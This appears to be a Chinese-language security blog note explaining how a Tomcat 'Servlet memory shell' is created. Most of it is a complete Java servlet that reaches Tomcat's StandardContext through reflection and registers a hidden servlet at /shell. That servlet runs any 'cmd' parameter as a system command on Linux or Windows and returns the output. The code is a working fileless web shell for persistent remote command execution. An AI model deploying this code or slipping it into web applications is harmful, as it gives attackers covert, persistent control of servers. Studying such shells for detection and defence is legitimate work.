### Servlet内存马

#### 分析

**创建流程**

- 创建恶意Servlet
- 用Wrapper对其进行封装
- 添加封装后的恶意Wrapper到StandardContext的children当中
- 添加ServletMapping将访问的URL和Servlet进行绑定

```java
package pres.test.momenshell;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class AddTomcatServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            String name = "RoboTerh";
            //从req中获取ServletContext对象
            ServletContext servletContext = req.getServletContext();
            if (servletContext.getServletRegistration(name) == null) {
                StandardContext o = null;

                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                while (o == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);

                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }

                //自定义servlet
                Servlet servlet = new Servlet() {
                    @Override
                    public void init(ServletConfig servletConfig) throws ServletException {

                    }

                    @Override
                    public ServletConfig getServletConfig() {
                        return null;
                    }

                    @Override
                    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                        String cmd = servletRequest.getParameter("cmd");
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        PrintWriter out = servletResponse.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }

                    @Override
                    public String getServletInfo() {
                        return null;
                    }

                    @Override
                    public void destroy() {

                    }
                };

                //用Wrapper封装servlet
                Wrapper newWrapper = o.createWrapper();
                newWrapper.setName(name);
                newWrapper.setLoadOnStartup(1);
                newWrapper.setServlet(servlet);

                //向children中添加Wrapper
                o.addChild(newWrapper);
                //添加servlet的映射
                o.addServletMappingDecoded("/shell", name);

                PrintWriter printWriter = resp.getWriter();
                printWriter.println("servlet added");
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

